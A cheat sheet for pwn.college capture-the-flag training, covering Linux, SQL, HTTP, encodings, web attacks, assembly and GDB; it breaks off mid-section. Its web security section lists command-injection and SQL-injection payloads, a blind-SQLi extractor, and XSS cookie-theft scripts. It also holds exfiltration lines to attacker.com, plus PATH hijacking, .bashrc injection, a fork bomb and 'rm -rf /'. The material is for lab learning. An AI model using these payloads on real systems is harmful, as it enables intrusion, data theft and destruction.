# 📋 pwn.college Master Cheat Sheet

**Quick-reference for every topic. Copy-paste ready.**

---

# 📑 Table of Contents
1. [Linux Fundamentals](#-1-linux-fundamentals)
2. [SQL](#-2-sql)
3. [HTTP / Talking Web](#-3-http--talking-web)
4. [Encodings](#-4-encodings)
5. [Web Security](#-5-web-security)
6. [Assembly & Syscalls](#-6-assembly--syscalls)
7. [Reverse Engineering (cIMG + GDB)](#-7-reverse-engineering-cimg--gdb)
8. [Network Interception](#-8-network-interception)
9. [Universal Payload/Encoding Table](#-9-universal-payloadencoding-table)

---

# 🐧 1. Linux Fundamentals

## 1.1 Paths

| Item | Meaning | Example |
|------|---------|---------|
| `/` | Root | `cd /` |
| `.` | Current dir | `./run` |
| `..` | Parent dir | `../run` |
| `~` | Home | `~/x` → `/home/hacker/x` |
| Absolute | Starts with `/` | `/challenge/run` |
| Relative | Doesn't start with `/` | `challenge/run` |

**Stack layout at program start:**
```
[rsp]    = argc
[rsp+8]  = argv[0]  (program name)
[rsp+16] = argv[1]  (first arg)
```

---

## 1.2 Essential Commands

| Command | Purpose | Common Flags |
|---------|---------|--------------|
| `cat file` | Print contents | `cat /flag` |
| `ls` | List dir | `-l` (long), `-a` (all), `-h` (human) |
| `grep PATTERN file` | Search text | `-i` (ignore case), `-v` (invert), `-o` (only match) |
| `find PATH -name X` | Find files | `2>/dev/null` to silence errors |
| `touch f` | Create empty file | – |
| `mkdir d` | Create dir | `-p` (parents) |
| `rm f` | Delete file | `-r` (recursive), `-f` (force) |
| `mv src dst` | Move/rename | – |
| `cp src dst` | Copy | `-r` (recursive) |
| `diff a b` | Compare files | – |
| `ln -s TARGET LINK` | Symlink | – |
| `file f` | Identify type | – |
| `which cmd` | Find executable | – |
| `id` | Show user/groups | – |
| `env` | List environment vars | – |

---

## 1.3 File Globbing

| Wildcard | Matches | Example |
|----------|---------|---------|
| `*` | 0+ chars | `file_*` → `file_a`, `file_bb` |
| `?` | 1 char | `file_?` → `file_a` |
| `[abc]` | One of these | `file_[ab]` → `file_a`, `file_b` |
| `[a-z]` | Range | `file_[a-c]` → `file_a`, `file_b`, `file_c` |
| `[!abc]` / `[^abc]` | NOT one of these | `file_[!a]` → `file_b`, `file_c` |

**Combine globs:**
```bash
/challenge/run /challenge/files/file_[bash]
/challenge/run *p*
/challenge/run [!pwn]*
```

---

## 1.4 Piping & Redirection

| Operator | Effect |
|----------|--------|
| `>` | Write stdout to file (overwrite) |
| `>>` | Append stdout to file |
| `<` | Read stdin from file |
| `2>` | Write stderr to file |
| `2>&1` | Merge stderr into stdout |
| `\|` | Pipe stdout to next command |
| `\|&` | Pipe stdout+stderr |
| `tee file` | Duplicate stream to file AND stdout |

**File descriptors:**

| FD | Name | Default |
|----|------|---------|
| 0 | stdin | keyboard |
| 1 | stdout | terminal |
| 2 | stderr | terminal |

**Patterns:**
```bash
cmd > out.txt 2> err.txt       # separate
cmd > out.txt 2>&1              # merge
cmd 2>&1 | grep flag            # grep errors
cmd | tee copy.txt | next_cmd   # tee
diff <(cmd1) <(cmd2)            # process substitution
cmd 2> >(prog1) | prog2         # split stdout/stderr
mkfifo p; cmd > p & cat p       # named pipe (FIFO)
```

---

## 1.5 Shell Variables

```bash
VAR=value              # local
export VAR=value       # exported (inherited by children)
echo $VAR
echo ${VAR}
VAR=$(cmd)             # command substitution
read VAR < file        # read line from file
read -r VAR            # no backslash interpretation
```

**Key:** exported vars are visible in `env`; local vars are not.

---

## 1.6 Text Manipulation

| Command | Purpose | Example |
|---------|---------|---------|
| `tr SET1 SET2` | Translate chars | `tr 'a-z' 'A-Z'` |
| `tr -d SET` | Delete chars | `tr -d '\n'` |
| `tr -s SET` | Squeeze repeats | `tr -s ' '` |
| `head -n N` | First N lines | `head -n 7` |
| `tail -n N` | Last N lines | `tail -n 5` |
| `cut -d D -f F` | Extract column | `cut -d ' ' -f 2` |
| `sort` | Sort lines | `-n` (numeric), `-r` (reverse), `-u` (unique) |
| `uniq` | Dedupe lines | `-c` (count) |
| `wc` | Count | `-l` (lines), `-w` (words), `-c` (bytes) |
| `sed 's/old/new/g'` | Substitute | `sed 's/X//g'` (delete X) |
| `awk '{print $2}'` | Field extraction | – |

**One-liners:**
```bash
cmd | tr -d '\n'                     # join lines
cmd | cut -d ' ' -f 2 | tr -d '\n'   # column 2 joined
cmd | sed 's/FAKE//g'                # strip text
sort file | tail -n 1                # last line
```

---

## 1.7 Processes & Jobs

| Command | Purpose |
|---------|---------|
| `ps -ef` | All processes (full) |
| `ps aux` | All processes (BSD) |
| `ps -efww` | Full width (no truncation) |
| `kill PID` | Terminate (SIGTERM) |
| `kill -9 PID` | Force kill (SIGKILL) |
| `pkill -f NAME` | Kill by pattern |
| `Ctrl+Z` | Suspend current job |
| `fg` | Resume in foreground |
| `bg` | Resume in background |
| `jobs` | List jobs |
| `cmd &` | Run in background |

**Find renamed binary:**
```bash
ps -ef | grep challenge
```

---

## 1.8 Users

```bash
su USER              # switch user
sudo CMD             # run as root
john /challenge/shadow-leak   # crack passwords
```

---

## 1.9 Permissions

```
-rwxr-xr-x
 │└┬┘└┬┘└┬┘
 │ │  │  └── Others
 │ │  └───── Group
 │ └──────── Owner
 └────────── Type (- file, d dir, l symlink)
```

**Octal permissions:**

| Octal | Symbolic | Meaning |
|-------|----------|---------|
| 0 | `---` | None |
| 1 | `--x` | Execute |
| 2 | `-w-` | Write |
| 3 | `-wx` | Write+exec |
| 4 | `r--` | Read |
| 5 | `r-x` | Read+exec |
| 6 | `rw-` | Read+write |
| 7 | `rwx` | Full |

**Commands:**

| Command | Purpose | Example |
|---------|---------|---------|
| `chmod MODE FILE` | Change perms | `chmod a+r /flag` |
| `chmod u+s FILE` | Set SUID | `chmod u+s prog` |
| `chmod 400 FILE` | Set exact | `chmod 400 /flag` |
| `chown USER FILE` | Change owner | `chown hacker /flag` |
| `chgrp GROUP FILE` | Change group | `chgrp hacker /flag` |

**`chmod` syntax:**

| Who | Operator | What |
|-----|----------|------|
| `u` (user) | `+` (add) | `r` (read) |
| `g` (group) | `-` (remove) | `w` (write) |
| `o` (other) | `=` (set) | `x` (execute) |
| `a` (all) | | `s` (SUID/SGID) |

**SUID:** `-rwsr-xr-x` — runs with **owner's** privileges (`s` replaces user `x`).

---

## 1.10 Chaining & Scripting

| Operator | Behavior |
|----------|----------|
| `;` | Always run both |
| `&&` | Run 2nd only if 1st succeeds |
| `\|\|` | Run 2nd only if 1st fails |

**Shebang script:**
```bash
#!/bin/bash
echo "hello"
```
```bash
chmod a+x script.sh
./script.sh
```

**Script special vars:**

| Var | Meaning |
|-----|---------|
| `$0` | Script name |
| `$1`–`$9` | Positional args |
| `$@` | All args |
| `$#` | Arg count |
| `$?` | Exit status of last command |

**Conditionals:**
```bash
if [ "$1" == "pwn" ]; then
  echo "college"
elif [ "$1" == "hack" ]; then
  echo "planet"
else
  echo "unknown"
fi
```

---

## 1.11 Terminal Multiplexing

| Action | `screen` | `tmux` |
|--------|----------|--------|
| Start | `screen` | `tmux` |
| Detach | `Ctrl-a d` | `Ctrl-b d` |
| List | `screen -ls` | `tmux ls` |
| Attach | `screen -r` | `tmux a` |
| New window | `Ctrl-a c` | `Ctrl-b c` |
| Next | `Ctrl-a n` | `Ctrl-b n` |
| Prev | `Ctrl-a p` | `Ctrl-b p` |
| Window N | `Ctrl-a N` | `Ctrl-b N` |
| Picker | `Ctrl-a "` | `Ctrl-b w` |

---

## 1.12 PATH Variable

```bash
PATH=/usr/bin:/bin:/usr/local/bin
PATH=""                        # disable all command lookup
PATH=/challenge/more_commands/ # override entirely
export PATH=/home/hacker:$PATH # prepend (hijack!)
```

**PATH hijack attack:**
```bash
# Fake `rm` that prints the flag
echo "/bin/cat /flag" > ~/rm
chmod +x ~/rm
PATH=/home/hacker
/challenge/run
```

**Which `win` will run:**
```bash
which win     # shows which binary the shell will use
```

---

## 1.13 Shenanigans (Persistence Attacks)

### `.bashrc` Injection
```bash
echo "cat /flag" >> /home/zardus/.bashrc
/challenge/victim
```

### Sniffing Inputs (hijack `flag_checker`)
```bash
# Fake flag_checker that captures typed input
cat > /home/hacker/flag_checker << 'EOF'
#!/bin/bash
echo "Type the flag"
read FLAG
echo "You entered: $FLAG"
EOF
chmod +x /home/hacker/flag_checker

# Hijack PATH in victim's .bashrc
echo 'export PATH=/home/hacker:$PATH' >> /home/zardus/.bashrc
/challenge/victim
```

### Overshared Directories (replace `.bashrc`)
```bash
cat > /home/hacker/.bashrc << 'EOF'
echo "Type the flag"
read FLAG
echo "Captured: $FLAG"
EOF
rm /home/zardus/.bashrc
cp /home/hacker/.bashrc /home/zardus/.bashrc
/challenge/victim
```

### Tricky Linking (symlink attack)
```bash
rm /tmp/collab/evil-commands.txt
ln -s /home/zardus/.bashrc /tmp/collab/evil-commands.txt
/challenge/victim     # run 1: injects "cat /flag" into .bashrc
/challenge/victim     # run 2: executes injected command
```

### Sniffing Process Arguments
```bash
while true; do ps aux | grep zardus | grep -v grep; sleep 0.1; done
# Catch password in output, then:
su zardus
sudo cat /flag
```

### Snooping on Configurations
```bash
cat /home/zardus/.bashrc
# Look for FLAG_GETTER_API_KEY=...
flag_getter --key sk-XXXX
```

---

## 1.14 Daring Destruction

### Fork Bomb
```bash
cat > bomb.sh << 'EOF'
#!/bin/bash
./bomb.sh & ./bomb.sh &
EOF
chmod +x bomb.sh
./bomb.sh
```
> Run `/challenge/check` in a **separate terminal first**.

### Disk-Space Doomsday
```bash
yes > big_junk_file       # wait for "No space left on device"
/challenge/check          # check 1 (disk full)
rm big_junk_file          # clean up
/challenge/check          # check 2 (flag)
```

### `rm -rf /`
```bash
/challenge/check          # start checker in another terminal first
rm -rf / --no-preserve-root
# Then, since cat is gone, use built-ins:
read -r FLAG < /flag
echo $FLAG
```

---

# 🗄️ 2. SQL

## 2.1 Query Syntax

```sql
SELECT cols FROM table;
SELECT * FROM table;
SELECT DISTINCT col FROM table;
SELECT col1, col2 FROM table;
```

## 2.2 WHERE Operators

| Operator | Meaning |
|----------|---------|
| `=` | Equal |
| `!=` / `<>` | Not equal |
| `>`, `<`, `>=`, `<=` | Comparison |
| `LIKE 'x%'` | Pattern (prefix) |
| `LIKE '%x'` | Pattern (suffix) |
| `LIKE '%x%'` | Pattern (contains) |
| `AND`, `OR`, `NOT` | Combine |
| `BETWEEN a AND b` | Range |
| `IN (a, b, c)` | Membership |
| `IS NULL` | NULL check |

## 2.3 Functions

| Function | Purpose | Example |
|----------|---------|---------|
| `SUBSTR(s, start, len)` | Substring (1-indexed) | `SUBSTR(pw, 1, 1)` |
| `LENGTH(s)` | String length | `LENGTH(pw)` |
| `LOWER(s)` / `UPPER(s)` | Case | `LOWER(name)` |
| `TRIM(s)` | Strip whitespace | – |
| `REPLACE(s, a, b)` | Replace | – |
| `ABS(n)` | Absolute value | – |
| `COUNT(*)` | Row count | `COUNT(*)` |
| `MAX` / `MIN` | Extremes | `MAX(id)` |
| `GROUP_CONCAT` | Join values | `GROUP_CONCAT(name)` |
| `CHAR(n)` | ASCII from code | `CHAR(65)` → `A` |
| `ASCII(s)` | Code from char | `ASCII('A')` → 65 |

## 2.4 LIMIT & OFFSET

```sql
SELECT * FROM t LIMIT 5;
SELECT * FROM t LIMIT 5 OFFSET 10;
SELECT * FROM t LIMIT 10, 5;     -- MySQL style (offset, count)
```

## 2.5 Metadata (sqlite_master)

```sql
-- List tables
SELECT name FROM sqlite_master WHERE type='table';

-- Table schema
SELECT sql FROM sqlite_master WHERE type='table' AND name='users';

-- All objects
SELECT type, name FROM sqlite_master;

-- List indexes
SELECT name FROM sqlite_master WHERE type='index';
```

## 2.6 Common Patterns

```sql
-- Basic
SELECT secret FROM details WHERE flag_tag = 1337;
SELECT flag FROM flags WHERE flag_tag != 1;
SELECT secret FROM data WHERE flag_tag = 'yep';

-- Substring
SELECT SUBSTR(record, 1, 1) FROM fragments WHERE SUBSTR(record, 1, 1) = 'p';

-- Chunked flag extraction
SELECT SUBSTR(value, 1, 4) FROM archive WHERE SUBSTR(value, 1, 3) = "pwn";
SELECT SUBSTR(value, 5, 4) FROM archive WHERE SUBSTR(value, 1, 3) = "pwn";
```

---

# 🌐 3. HTTP / Talking Web

## 3.1 Request / Response Anatomy

```
# Request
GET /path HTTP/1.1
Host: challenge.localhost:80
User-Agent: Firefox
Cookie: session=abc
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

parameter=value

# Response
HTTP/1.1 200 OK
Server: Werkzeug
Set-Cookie: session=abc123; Path=/
Content-Type: text/html
Content-Length: 123

<html>...</html>
```

## 3.2 HTTP Methods

| Method | Purpose |
|--------|---------|
| `GET` | Retrieve resource |
| `POST` | Submit data |
| `PUT` | Replace resource |
| `DELETE` | Remove resource |
| `HEAD` | Headers only |
| `OPTIONS` | Allowed methods |

## 3.3 Status Codes

| Code | Meaning |
|------|---------|
| 200 | OK |
| 302 | Found (redirect) |
| 400 | Bad Request |
| 401 | Unauthorized |
| 403 | Forbidden |
| 404 | Not Found |
| 500 | Server Error |

## 3.4 curl Cheat Sheet

```bash
# GET
curl URL
curl "URL?k1=v1&k2=v2"

# Custom headers
curl -H "User-Agent: Firefox" URL
curl -H "Host: challenge.localhost" URL
curl -H "Cookie: session=abc" URL

# Cookies
curl -b "session=abc" URL          # send
curl -c cookies.txt URL            # save
curl -b cookies.txt URL            # send from file

# POST
curl -X POST -d "u=a&p=b" URL
curl --data-urlencode "u=a b" URL

# Form upload
curl -F "file=@x.txt" URL

# Follow redirects
curl -L URL

# Verbose
curl -v URL
curl -I URL     # headers only
curl -s URL     # silent
curl --path-as-is URL   # don't normalize ../
```

## 3.5 netcat Cheat Sheet

```bash
# GET
echo -ne "GET /path HTTP/1.1\r\nHost: challenge.localhost:80\r\n\r\n" | nc host 80

# GET with headers
echo -ne "GET / HTTP/1.1\r\nHost: challenge.localhost:80\r\nCookie: s=abc\r\n\r\n" | nc host 80

# POST
echo -ne "POST /path HTTP/1.1\r\nHost: challenge.localhost:80\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 11\r\n\r\nparameter=value" | nc host 80

# Listen (server)
nc -l -v -p 1337
```

## 3.6 Python requests

```python
import requests

# GET
r = requests.get("http://host/path")
print(r.text)

# POST
r = requests.post("http://host/path", data={"u": "a"})
print(r.text)

# Headers
r = requests.get("http://host", headers={"Host": "challenge.localhost"})

# Cookies
s = requests.Session()
r = s.get("http://host", cookies={"session": "abc"})
```

## 3.7 JavaScript (browser context)

```html
<!-- Redirect -->
<script>window.location.href='http://host/path';</script>

<!-- Fetch GET -->
<script>
fetch('http://host/path')
  .then(r => r.text())
  .then(c => window.location.href='/home/hacker/public_html/solve.html'+c);
</script>

<!-- Fetch POST -->
<script>
fetch('http://host/path', {
  method: 'POST',
  body: new URLSearchParams({a: 'b', c: 'd'})
}).then(r => r.text()).then(c => window.location.href='/x'+c);
</script>

<!-- Include external script -->
<script src='http://host/solve'></script>
```

## 3.8 URL Encoding

| Char | Enc |
|------|-----|
| ` ` | `%20` |
| `/` | `%2F` |
| `?` | `%3F` |
| `&` | `%26` |
| `=` | `%3D` |
| `+` | `%2B` |
| `#` | `%23` |
| `%` | `%25` |

---

# 🔢 4. Encodings

## 4.1 Quick Reference

| Format | Example | Python |
|--------|---------|--------|
| **Hex** | `41` = `A` | `bytes.fromhex()` / `.hex()` |
| **Binary** | `01000001` = `A` | `format(b, '08b')` |
| **Base64** | `QQ==` = `A` | `base64.b64encode()` / `b64decode()` |
| **UTF-8** | `\xf0\x9f\x93\x8a` = 📊 | `.encode("utf-8")` |
| **UTF-16 LE** | `A\x00` = `A` | `.encode("utf-16-le")` |
| **ASCII** | `65` = `A` | `ord()` / `chr()` |

## 4.2 Hex

```bash
# String → hex
echo -n "hello" | xxd -p
echo -n "hello" | od -An -tx1

# Hex → bytes (supply to program)
echo -n "68656c6c6f" | /challenge/runme

# Raw bytes with \x (shell)
echo -e -n "\x68\x65\x6c\x6c\x6f" | /challenge/runme

# gdb
(gdb) p/x "hello"
$1 = {0x68, 0x65, 0x6c, 0x6c, 0x6f, 0x0}
```

## 4.3 Base64

```bash
# Encode
echo -n "hello" | base64
echo -e -n '\x83\x32\xdb' | base64

# Decode
echo -n "aGVsbG8=" | base64 -d
```

```python
import base64
base64.b64encode(b"hello")     # b'aGVsbG8='
base64.b64decode("aGVsbG8=")   # b'hello'
```

## 4.4 UTF-16 (Little-Endian on x86)

Each char = 2 bytes: **char, 0x00**

```bash
# "mpseczuv" in UTF-16 LE
echo -e -n '\x6d\x00\x70\x00\x73\x00\x65\x00\x63\x00\x7a\x00\x75\x00\x76\x00'
```

## 4.5 Nested Encoding

```python
# 4-level hex
a = b'pkukrtnj'
h = a.hex().encode().hex().encode().hex().encode().hex()
```

**Reverse pattern (reversed hex):**
```python
original = b'\xdcr\x9dn\x14W\xab\xbe'
reversed_hex = original.hex()[::-1]    # 'ebba7541e6d927cd'
```

## 4.6 Encode/Decode Table

| Operation | Python | Bash |
|-----------|--------|------|
| Hex encode | `b.hex()` | `xxd -p` |
| Hex decode | `bytes.fromhex(s)` | `xxd -r -p` |
| Base64 encode | `base64.b64encode(b)` | `base64` |
| Base64 decode | `base64.b64decode(s)` | `base64 -d` |
| UTF-8 encode | `s.encode("utf-8")` | `iconv -t utf-8` |
| ASCII code | `ord(c)` | `printf '%d' "'c"` |
| Char from code | `chr(n)` | `printf \\$(printf '%03o' n)` |

---

# 🛡️ 5. Web Security

## 5.1 Path Traversal

**Vulnerable:**
```python
path = base + "/files/" + user_input
open(path)
```

**Payloads:**
```bash
curl --path-as-is "http://host/package/../../../flag"
curl --path-as-is "http://host/package/../../../../etc/passwd"
```

**Encoding variants:**
```
../../../flag
%2e%2e%2f%2e%2e%2fflag
%252e%252e%252fflag
..%2f..%2fflag
```

**Depth formula:** count directories from base to `/`, use that many `../`.

## 5.2 Command Injection — Separators

| Char | URL Enc | Behavior |
|------|---------|----------|
| `;` | `%3B` | Sequential |
| `&&` | `%26%26` | AND |
| `\|\|` | `%7C%7C` | OR |
| `\|` | `%7C` | Pipe |
| `&` | `%26` | Background |
| `\n` | `%0A` | Newline |
| `\t` | `%09` | Tab |

**Command substitution:**

| Syntax | URL Enc |
|--------|---------|
| `` `cmd` `` | `%60cmd%60` |
| `$(cmd)` | `%24%28cmd%29` |

**Space bypass:**

| Bypass | URL Enc |
|--------|---------|
| `${IFS}` | `%24%7BIFS%7D` |
| Tab | `%09` |
| `{,,}` (brace) | `%7B%2C%2C%7D` |
| `<>` (redir) | `%3C%3E` |

**Slash bypass:**

```
${HOME:0:1}
${PATH:0:1}
${PWD:0:1}
```

**Payload examples:**
```bash
# Basic
;cat /flag
%3Bcat%20/flag

# Bypass ; filter (use &&)
&&cat /flag
%26%26cat%20/flag

# Bypass space filter
;cat${IFS}/flag

# Command substitution (works in URL params)
$(cat /flag)
%24%28cat%20/flag%29

# Wildcards
;cat /fla*
```

## 5.3 Blind Command Injection

| Technique | Payload |
|-----------|---------|
| **Time-based** | `; sleep 5` |
| **Write to web dir** | `; cat /flag > /var/www/html/flag.txt` |
| **Write to /tmp** | `; cat /flag > /tmp/flag` |
| **DNS exfil** | `; nslookup $(cat /flag \| base64).attacker.com` |
| **HTTP exfil** | `; curl -d "$(cat /flag)" http://attacker.com/` |

**Verify injection:**
```bash
time curl "http://host/puzzle?file=/x%3Bsleep%205"
```

## 5.4 Authentication Bypass

| Vector | Payload |
|--------|---------|
| **URL param** | `?session_user=admin` |
| **Cookie** | `Cookie: session_user=admin` |
| **SQL injection** | `user=admin' --` |
| **SQL OR** | `user=admin' OR '1'='1` |
| **SQL # comment** | `user=admin' #` |

## 5.5 SQL Injection — Auth Bypass

```bash
# Comment out password
curl -X POST "http://host/login" -d "user=admin' --" -d "pass=x"

# OR injection
curl -X POST "http://host/login" -d "user=admin' OR '1'='1" -d "pass=x"

# Unquoted numeric field
curl -X POST "http://host/login" -d "name=admin" -d "pin=0 OR 1=1 --"

# Using #
curl -X POST "http://host/login" -d "user=admin' #" -d "pass=x"
```

## 5.6 UNION SQL Injection

```bash
# Basic
' UNION SELECT password FROM users WHERE username='admin' --

# URL encoded
admin%22%20UNION%20SELECT%20password%20FROM%20users%20WHERE%20username=%22admin%22%20--

# Table names
' UNION SELECT name FROM sqlite_master WHERE type='table' --

# Schemas
' UNION SELECT sql FROM sqlite_master WHERE type='table' --

# Multiple columns
' UNION SELECT rowid, username, password FROM users --

# Concatenate
' UNION SELECT username || ':' || password FROM users --
```

**Common error:** "wrong number of columns" → try 1, 2, 3, 4 columns until it works.

## 5.7 Blind SQL Injection — Boolean

```bash
# Test injection
curl -X POST "http://host/login" -d "user=admin" -d "pass=' OR 1=1 --"
# 302 = works, 403 = doesn't

# Test single char
curl -X POST "http://host/login" -d "user=admin" \
  -d "pass=' OR (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='p' --"
```

**Binary search (faster):**
```python
mid = (low+high)//2
condition = f"SUBSTR(password,{pos},1) <= CHAR({mid})"
```

**Full extractor:**
```python
import requests
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}"
flag = ""
for pos in range(1, 50):
    for c in chars + "}":
        p = f"' OR (SELECT SUBSTR(password,{pos},1) FROM users WHERE username='admin')='{c}' --"
        r = requests.post("http://host/login",
            data={"user": "admin", "pass": p}, allow_redirects=False)
        if r.status_code == 302:
            flag += c
            print(flag)
            break
```

## 5.8 XSS — Payloads

| Context | Payload |
|---------|---------|
| **HTML body** | `<script>alert(1)</script>` |
| **Textarea** | `</textarea><script>alert(1)</script>` |
| **Attribute** | `"><script>alert(1)</script>` |
| **Img onerror** | `<img src=x onerror=alert(1)>` |
| **Body onload** | `<body onload=alert(1)>` |
| **SVG onload** | `<svg onload=alert(1)>` |
| **Details** | `<details ontoggle=alert(1)>` |

**Stored XSS — inject textboxes:**
```bash
curl -X POST "http://host/" -d "content=<input type='text'><input type='text'>"
/challenge/victim "http://host/"
```

**Exfiltration payloads:**
```html
<!-- Cookie -->
<script>fetch('http://localhost:1337/?c='+encodeURIComponent(document.cookie))</script>

<!-- Entire page (for HttpOnly bypass) -->
<script>
fetch('/').then(r=>r.text()).then(html=>{
  fetch('http://localhost:1337/', {method:'POST', body:html})
})
</script>

<!-- Publish (CSRF via XSS) -->
<script>fetch('/publish', {method:'POST'})</script>

<!-- Publish + exfiltrate -->
<script>
fetch('/publish', {method:'POST'})
  .then(()=>fetch('/'))
  .then(r=>r.text())
  .then(html=>{
    const f = html.match(/flag\{[^}]+\}/);
    if (f) fetch('http://localhost:1337/', {method:'POST', body:f[0]});
  })
</script>
```

## 5.9 XSS — Debugging

```bash
# Check reflection
curl -s "http://host/?msg=test" | grep test

# Count inputs
curl -s "http://host/" | grep -o "<input" | wc -l

# Save page
curl -s "http://host/" > page.html

# Verify HTML validity (in browser: View Source)
```

---

# ⚙️ 6. Assembly & Syscalls

## 6.1 Register Cheat Sheet

| 64-bit | 32-bit | 16-bit | 8-bit |
|--------|--------|--------|-------|
| `rax` | `eax` | `ax` | `al` |
| `rbx` | `ebx` | `bx` | `bl` |
| `rcx` | `ecx` | `cx` | `cl` |
| `rdx` | `edx` | `dx` | `dl` |
| `rsi` | `esi` | `si` | `sil` |
| `rdi` | `edi` | `di` | `dil` |
| `rbp` | `ebp` | `bp` | `bpl` |
| `rsp` | `esp` | `sp` | `spl` |
| `r8`–`r15` | `r8d`… | `r8w`… | `r8b`… |

**Special:** `dil` = low byte of `rdi`, `al` = low byte of `rax`.

## 6.2 Syscall Convention

| Register | Purpose |
|----------|---------|
| `rax` | Syscall number |
| `rdi` | 1st arg |
| `rsi` | 2nd arg |
| `rdx` | 3rd arg |
| `r10` | 4th arg |
| `r8` | 5th arg |
| `r9` | 6th arg |
| `rax` | Return value |

## 6.3 Syscall Table

| # | Name | Args |
|---|------|------|
| 0 | `read` | `rdi`=fd, `rsi`=buf, `rdx`=count |
| 1 | `write` | `rdi`=fd, `rsi`=buf, `rdx`=count |
| 2 | `open` | `rdi`=path, `rsi`=flags, `rdx`=mode |
| 3 | `close` | `rdi`=fd |
| 41 | `socket` | `rdi`=domain, `rsi`=type, `rdx`=proto |
| 43 | `accept` | `rdi`=sock, `rsi`=addr, `rdx`=len |
| 49 | `bind` | `rdi`=sock, `rsi`=addr, `rdx`=len |
| 50 | `listen` | `rdi`=sock, `rsi`=backlog |
| 57 | `fork` | – |
| 60 | `exit` | `rdi`=status |

**open flags:** `O_RDONLY`=0, `O_WRONLY`=1, `O_CREAT`=0x40, `O_TRUNC`=0x200, `O_WRONLY|O_CREAT`=0x41.

## 6.4 Instructions

| Instruction | Purpose |
|-------------|---------|
| `mov dst, src` | Copy |
| `lea dst, [expr]` | Load address |
| `add`, `sub` | Arithmetic |
| `imul dst, src` | Signed multiply |
| `div reg` | Divide `rdx:rax` by `reg` |
| `cmp a, b` | Compare (flags) |
| `and`, `or`, `xor`, `not` | Bitwise |
| `shl`, `shr` | Shift |
| `inc`, `dec` | ±1 |
| `push`, `pop` | Stack |
| `call`, `ret` | Function |
| `jmp`, `je`, `jne`, `jg`, `jl` | Control flow |
| `syscall` | Kernel |

**Div reminder:** `xor rdx, rdx` first; `rax` = quotient, `rdx` = remainder.

## 6.5 Jumps

| Jump | Condition |
|------|-----------|
| `jmp` | Always |
| `je` / `jz` | Equal / Zero |
| `jne` / `jnz` | Not equal |
| `jg` / `jl` | Greater / Less (signed) |
| `jge` / `jle` | ≥ / ≤ (signed) |
| `ja` / `jb` | Above / Below (unsigned) |
| `jae` / `jbe` | ≥ / ≤ (unsigned) |

## 6.6 Stack

```assembly
push rax    # rsp -= 8; [rsp] = rax
pop rax     # rax = [rsp]; rsp += 8
sub rsp, N  # allocate N bytes
add rsp, N  # free N bytes
```

**Stack at entry:**
```
[rsp]    = argc
[rsp+8]  = argv[0]
[rsp+16] = argv[1]
```

## 6.7 Common Patterns

```assembly
# Exit
mov rdi, 42
mov rax, 60
syscall

# Write
mov rdi, 1
mov rsi, buf
mov rdx, len
mov rax, 1
syscall

# Read
mov rdi, 0
mov rsi, buf
mov rdx, len
mov rax, 0
syscall

# Load from memory
mov rax, [rdi]          # 8 bytes
mov al, [rdi]           # 1 byte
mov eax, [rdi]          # 4 bytes
movzx rax, byte ptr [rdi]   # 1 byte, zero-extend

# Store to memory
mov [rsi], rax
mov qword ptr [rsi], 0
mov byte ptr [rsi], 'a'
```

## 6.8 sockaddr_in (16 bytes)

```assembly
sub rsp, 16
mov word ptr [rsp], 2         # AF_INET
mov word ptr [rsp+2], 0x5000  # port 80 (little-endian)
mov dword ptr [rsp+4], 0      # 0.0.0.0
mov qword ptr [rsp+8], 0      # padding
```

**Port encoding:** 80 = `0x0050` big-endian → `0x5000` little-endian. 1337 = `0x3905` big-endian → `0x0539` little-endian.

## 6.9 HTTP Response (19 bytes)

```assembly
.ascii "HTTP/1.0 200 OK\r\n\r\n"
```

Bytes: `48 54 54 50 2f 31 2e 30 20 32 30 30 20 4f 4b 0d 0a 0d 0a`

## 6.10 Assembly template

```assembly
.intel_syntax noprefix
.global _start
_start:
    # code
    mov rax, 60
    xor edi, edi
    syscall
```

Assemble + link:
```bash
as -o prog.o prog.s
ld -o prog prog.o
```

---

# 🔍 7. Reverse Engineering (cIMG + GDB)

## 7.1 cIMG Format Versions

| Ver | Header | Fields |
|-----|--------|--------|
| **1** | 6 bytes | `cIMG` + `version` (2) |
| **2** | 8 bytes | `cIMG` + `version` (2) + `width` (1) + `height` (1) |
| **3** | 12 bytes | `cIMG` + `version` (2) + `width` (1) + `height` (1) + `directives` (4) |

**All little-endian** (x86).

## 7.2 Magic Numbers

```python
# v1 example
b"cIMG"

# From C code: magic == 1919831931 (0x726E4F7B) → b"{Onr"
```

## 7.3 Pixel Format

```c
typedef struct {
    uint8_t r, g, b, ascii;   // 4 bytes per pixel
} pixel_t;
```

**ANSI rendered (24 bytes):**
```
\x1b[38;2;RRR;GGG;BBBmC\x1b[0m
 0  1  2  3  4  5  6  7 ...
```

| Offset | Content |
|--------|---------|
| 7:10 | R |
| 11:14 | G |
| 15:18 | B |
| 19 | ASCII |

## 7.4 Patch Directive

**Code:** `43709` (0xAABD) or `52965` (0xCEE5)

**Reads:**
- 1 byte `x`
- 1 byte `y`
- 1 byte `w`
- 1 byte `h`
- `w*h*4` bytes pixel data

**Writes rectangle at `(x, y)`.**

```python
import struct
body = struct.pack("<H", 43709) + bytes([x, y, w, h]) + pixel_data
```

## 7.5 GDB Basics

| Command | Purpose |
|---------|---------|
| `gdb ./bin` | Start |
| `break *addr` | Breakpoint |
| `break func` | Break at symbol |
| `run` | Start |
| `continue` | Resume |
| `stepi` / `si` | One instruction |
| `nexti` / `ni` | Step over call |
| `finish` | Finish function |
| `x/24xb addr` | Memory dump |
| `x/s addr` | String |
| `info registers` | Registers |
| `p $rax` / `p/x $rax` | Print register |
| `p &symbol` | Symbol address |
| `set $rax = val` | Modify register |
| `set *((long*)addr) = val` | Modify memory |
| `call (void) func()` | Call function |
| `display/24xb addr` | Auto-display |
| `disassemble main` | Disassembly |
| `quit` | Exit |

## 7.6 GDB Scripts

**Collect values:**
```gdb
set disassembly-flavor intel
set pagination off
set confirm off
handle SIGTRAP nostop noprint pass

start
break *main+798
commands
  silent
  set $v = *(unsigned long long*)($rbp-0x18)
  printf "Value: 0x%016llx\n", $v
  continue
end
continue
```

**Jump to win:**
```gdb
start
break *main+333
commands
  silent
  call (void) win()
  quit
end
continue
```

**Fix broken function:**
```gdb
start
break *win+20
commands
  silent
  set *(unsigned long long*)($rbp-0x8) = $rbp
  continue
end
break *main+333
commands
  silent
  set $rip = win
  continue
end
continue
```

## 7.7 Extract Symbol

```bash
